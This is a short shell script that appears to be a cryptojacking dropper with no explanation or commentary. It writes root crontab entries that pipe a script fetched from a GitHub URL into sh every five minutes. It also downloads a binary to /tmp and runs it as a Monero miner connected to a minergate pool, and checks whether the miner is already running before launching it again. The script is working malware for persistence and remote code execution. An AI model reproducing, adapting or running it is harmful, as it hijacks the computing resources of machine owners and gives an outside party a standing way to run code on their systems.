export PATN=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/pm.sh | sh" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/pm.sh | sh" > /var/spool/cron/crontabs/root
Doc2l()
{
if [ ! -f "/tmp/c2l" ];then
wget -O "/tmp/c2l" "https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/c2l.zip"
fi
chmod +x /tmp/c21
/tmp/c2l -t 1 -M stratum+tcp://c2l%40protonmail.com:x@xmr.pool.minergate.com:45560/xmr
}
ps auxf|grep -v grep|grep "c2l" || Doc2l
